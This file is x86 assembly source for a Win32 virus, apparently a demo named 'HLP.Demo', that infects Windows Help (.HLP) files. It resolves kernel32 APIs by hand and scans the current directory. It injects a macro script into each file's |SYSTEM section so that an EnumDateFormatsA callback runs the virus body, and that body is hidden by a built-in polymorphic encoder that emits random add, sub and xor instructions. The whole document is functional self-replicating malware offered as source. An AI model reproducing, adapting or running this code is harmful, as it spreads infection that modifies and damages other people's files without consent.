   .386p
   .model flat, stdcall
   include win.inc

   .data
           db 0

   stackvar        struct

   impfunctions    label
   _ExitProcess    dd ?
   _CreateFileA    dd ?
   _ReadFile       dd ?
   _WriteFile      dd ?
   _SetFilePointer dd ?
   _CloseHandle    dd ?
   _GetTickCount   dd ?
   _FindFirstFileA dd ?
   _FindNextFileA  dd ?
   _FindClose      dd ?

   mainhdr         label
   magic           dd ?
   diroffset       dd ?
   ffvalue         dd ?
   filesize        dd ?

   tempvar         dd ?
   tempSP          dd ?
   seed            dd ?
   handle          dd ?
   temp_sp         dd ?
   syshdr          db 15h dup (?)
   syshdrend       label
   pagedir         db 300h dup (?)

           ; start of win32 search record
   FindData        label
   FileAttr        dd ?
   FileCreateTime  dq ?
   FileAccessTime  dq ?
   FileWriteTime   dq ?
   FileSizeHigh    dd ?
   FileSizeLow     dd ?
   reserv          dd ?,?
   Filename        db MAX_PATH dup(?)
   ShortFileName   db 14 dup (?)
           ; end of search record

   stackvar        ends

   .code

   start:  nop


           call EnumDateFormatsA,offset callback1,2048,2
           call ExitProcess,0
   callback1:
           sub esp,virsize
           jmp callback



   virstart:
   callback:                       ; callback to EnumDateFormats()
           nop
           pushad
           mov ebx,[esp+20h+virsize]       ; get address inside kernel32.dll
                                           ; (return adr to EnumDateFormats)
           sub esp,size stackvar
           mov ebp,esp     ; create stack frame

           call _next      ; find delta offset
   _next:  pop edi
           sub edi,offset _next

           call FindAPI
           jz short quit           ; exit if GetProcAddress API not found

           call [ebp._GetTickCount]
           mov [ebp.seed],eax      ; randomize

           lea edx,[edi+mask]
           lea esi,[ebp.FindData]
           call [ebp._FindFirstFileA],edx,esi
           inc eax
           jz short quit
           dec eax
   findlp: push esi eax
           lea ebx,[ebp.Filename]
           call try_help
           pop eax esi
           push eax
           call [ebp._FindNextFileA],eax,esi
           test eax,eax
           pop eax
           jnz short findlp
           call [ebp._FindClose],eax

   quit:   add esp,size stackvar
           xor eax,eax
           popad
           add esp,virsize
           ret 4   ; return from callback

   FindAPI:and ebx,0ffff0000h
   Find1:  cmp word ptr [ebx],'ZM'         ; looking for kernel32 start
           jz short MZfound
           sub ebx,000010000h
           cmp ebx,000400000h
           ja short Find1
           xor ebx,ebx
           ret
   MZfound:mov edx,dword ptr [ebx+3ch]
           cmp word ptr [edx+ebx],'EP'         ; is it PE ?
           jnz short Find1
           mov esi,dword ptr [ebx+edx+78h]
           add esi,ebx                     ; esi = export directory VA
           mov ecx,dword ptr [esi+0ch]
           mov eax,dword ptr [ecx+ebx]
           and eax,0dfdfdfdfh
           cmp eax,'NREK'                  ; is it kernel32.dll ?
           jnz short Find1
           mov eax,dword ptr [ecx+ebx+4]
           and ax,0dfdfh
           cmp eax,'23LE'
           jnz short Find1                 ; final test for kernel32
           mov ecx,dword ptr [esi+18h]
           mov edx,dword ptr [esi+20h]
   findname:                               ; looking for GetProcAddress
           mov eax,dword ptr [edx+ebx]
           cmp dword ptr [eax+ebx],'PteG'
           jnz short nextName
           cmp dword ptr [eax+ebx+4],'Acor'
           jnz short nextName
           cmp dword ptr [eax+ebx+8],'erdd'
           jnz short nextName
                                           ; ok - we'he found GetProcAddress name
           sub edx,dword ptr [esi+20h]     ; get function_number_in_name_table *4
           shr edx,1
           mov eax,dword ptr [esi+24h]     ; get start of ordinal table
           add eax,ebx
           movzx eax,word ptr [edx+eax]    ; get ordinal
           mov edx,[esi+1ch]
           add edx,ebx
           mov esi,dword ptr [edx+eax*4]   ; hooo... Get function address
           add esi,ebx                     ; now in esi
           lea edx,[edi+APInames]
           push ebp
   import: test byte ptr [edx],0ffh
           jz short Done
           push ebx edx
           call esi,ebx,edx                ; import function address
           pop edx ebx
           mov [ebp],eax
           add ebp,4
   nxtname:inc edx
           test byte ptr [edx-1],0ffh
           jz short import
           jmp short nxtname
   Done:   pop ebp
           test ebp,ebp                    ; clear zero flag to indicate success
           ret
   nextName:
           add edx,4
           loop findname
           xor ebx,ebx                     ; all names searched - needed function
           ret                             ; not found


   APInames:
           db 'ExitProcess',0
           db 'CreateFileA',0
           db 'ReadFile',0
           db 'WriteFile',0
           db 'SetFilePointer',0
           db 'CloseHandle',0
           db 'GetTickCount',0
           db 'FindFirstFileA',0
           db 'FindNextFileA',0
           db 'FindClose',0
           db 0


   script  dw 4,ss1
   sc1     db "RR(`uSeR32.dll',`MessageBoxA',`USSU')",0
   ss1     equ $-sc1
           dw 4,ss2
   sc2     db "MessageBoxA(0,`Trying to infect',`HLP.Demo',0)",0
   ss2     equ $-sc2
           dw 4,ss3
   sc3     db "RR(`kERnEL32.dLL',`EnumDateFormatsA',`SUU')",0
   ss3     equ $-sc3
           dw 4,(sc4end-sc4)+(scr2end-scr2)+(virsize/4*11)
   sc4     db "EnumDateFormatsA(`"
   sc4end  label

   scr2:   jmp esp
           db "',2048,2)",0
   scr2end label
                   ; EnumDateFormats(proc, LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE);
   ss4     equ $-sc4
           dw 4,ss5
   sc5     db "MessageBoxA(0,`Script comes to end!',`HLP.Demo',0)",0
   ss5     equ $-sc5

   Script2Len      equ $-scr2
   ScriptEnd       label
   ScriptSize      equ $-script+(virsize/4*11)


   return: ret

   ; infect HLP-file, input: ebx=lpFileName
   try_help:
           mov [ebp.tempSP],esp
           xor eax,eax
           call [ebp._CreateFileA],ebx,GENERIC_READ or GENERIC_WRITE,eax,eax,\
                           OPEN_EXISTING,eax,eax
           mov esi,eax             ; store file handle
           inc eax         ; test for INVALID_HANDLE_VALUE
           jz short return
           lea ebx,[ebp.mainhdr]
           push 10h
           pop eax
           call Read
           cmp dword ptr [ebx],35f3fh
           jnz short return
           mov eax,[ebp.diroffset]
           add eax,37h
           call [ebp._SetFilePointer],esi,eax,0,FILE_BEGIN ; seek page directory
           lea ebx,[ebp.pagedir]
           push 300h
           pop eax
           call Read
           mov ecx,eax
   again:  dec ecx
           jz short return
           cmp dword ptr [ebx+ecx],'SYS|'          ; '|SYS'
           jnz short again
           cmp dword ptr [ebx+ecx+4],'MET'         ; 'TEM',0
           jnz short again
           mov eax,[ebp.filesize]
           xchg dword ptr [ebx+ecx+8],eax  ; now eax=offset of |SYSTEM section
           call [ebp._SetFilePointer],esi,eax,0,FILE_BEGIN
           lea ebx,[ebp.syshdr]
           push 15h
           pop eax
           call Read
           mov eax,[ebx]      ; old section size

           mov [ebp.temp_sp],esp
           sub eax,15h             ; eax=section length (without header)
           sub esp,eax             ; alloc some place in stack
           mov ebx,esp
      ;        mov edx,[ebx]   ; load page to avoid exception
           call Read
           cmp dword ptr [ebx+4],"`(RR"    ; check for already infected
           jz abort

                           ; ===========================================
                           ; start of polymorph generator
                           ; ===========================================
           mov [ebp.handle],esi    ; store file handle to free esi for other use
           mov ecx,Script2Len
           lea ebx,[edi+ScriptEnd]
           call move

           lea ebx,[edi+virstart]
           mov ecx,virsize/4
   cryptloop:
           sub esp,11
   crypt_find_param:
           call RNum
           mov edx,eax
           call RNum
           shr eax,1
           mov esi,[ebx]
           jnc short noadd         ; add - 50%
           mov eax,esi
           sub eax,edx
           mov byte ptr [esp+5],5          ; `add eax,nnnn' opcode
           jmp short testforzero
   noadd:  shr eax,1
           jnc nosub               ; sub - 25%
           mov eax,edx
           sub eax,esi
           mov byte ptr [esp+5],2dh        ; `sub eax,nnnn' opcode
           jmp short testforzero
   nosub:  mov eax,esi             ; xor - 25%
           xor eax,edx
           mov byte ptr [esp+5],35h        ; `xor eax,nnnn' opcode
   testforzero:
           call testz
           jz short crypt_find_param
   next_dword:
           mov byte ptr [esp],0b8h         ; 'mov eax,nnnn' opcode
           mov [esp+1],edx
           mov [esp+6],eax
           mov byte ptr [esp+10],50h       ; `push eax' opcode
           add ebx,4
           loop cryptloop

           lea ebx,[edi+sc4end]
           mov ecx,sc4end-script
           call move

           add dword ptr [ebp.syshdr],ScriptSize
           add dword ptr [ebp.syshdr+4],ScriptSize

           lea ebx,[ebp.syshdrend]
           mov ecx,15h
           call move

           mov esi,[ebp.handle]            ; restore file handle
                                           ; jump to EOF
           call [ebp._SetFilePointer],esi,[ebp.filesize],0,FILE_BEGIN

           mov ebx,esp
           mov eax,dword ptr [ebp.syshdr]
           call Write
           mov esp,[ebp.temp_sp]           ; discard stack space

           add [ebp.filesize],eax
           call [ebp._SetFilePointer],esi,0,0,FILE_BEGIN
           push 10h
           pop eax
           lea ebx,[ebp.mainhdr]
           call Write                      ; update main header

           mov eax,[ebp.diroffset]
           add eax,37h
           call [ebp._SetFilePointer],esi,eax,0,FILE_BEGIN
           push 300h
           pop eax
           add ebx,pagedir-mainhdr
           call Write                      ; update page directory
   abort:  mov esp,[ebp.tempSP]
   close:  call [ebp._CloseHandle],esi     ; close file
           ret

   ; read eax bytes to ebx
   Read:   push ebx eax
           lea edx,[ebp.tempvar]
           call [ebp._ReadFile],esi,ebx,eax,edx,0
   read1:  test eax,eax
           pop eax ebx
           jz short abort
           ret
   ; write eax bytes from ebx
   Write:  push ebx eax
           lea edx,[ebp.tempvar]
           call [ebp._WriteFile],esi,ebx,eax,edx,0
           jmp short read1

   ; --------- put piece to stack ---------------
   move:   pop edx
   movelp: dec ebx
           mov al,[ebx]
           dec esp
           mov [esp],al
           loop movelp
           jmp edx
   ; -------------- get random 32-bit non-zero number -------------
   RNum:   mov eax,[ebp.seed]
           push ecx
           mov ecx,17
   RN11:   lea eax,[eax*4+eax]
           add eax,12479
           ror eax,cl
           jnc short noxor
           xor eax,6202355h
   noxor:  loop RN11
           mov [ebp.seed],eax
           pop ecx
           call testz
           jz short RNum
           ret
   ; --------------- check: is there zero bytes or ["`'] in eax ? -------------
   testz:  push eax ecx
           push 4
           pop ecx
   tst1:   cmp al,' '
           jbe testfailed
           cmp al,0f0h
           ja testfailed
           cmp al,'"'
           jz short testfailed
           cmp al,"'"
           jz short testfailed
           cmp al,'`'
           jz short testfailed
           cmp al,'\'
           jz short testfailed
           ror eax,8
           or eax,eax
           loop tst1
           inc ch
   testfailed:
           test ch,ch
           pop ecx eax
           ret

   mask    db '*.*',0

           @dwordalign virstart,0
   virend  label
   virsize equ offset virend - offset virstart



           ; API for starter
   extrn ExitProcess:PROC
   extrn EnumDateFormatsA:PROC
           end start
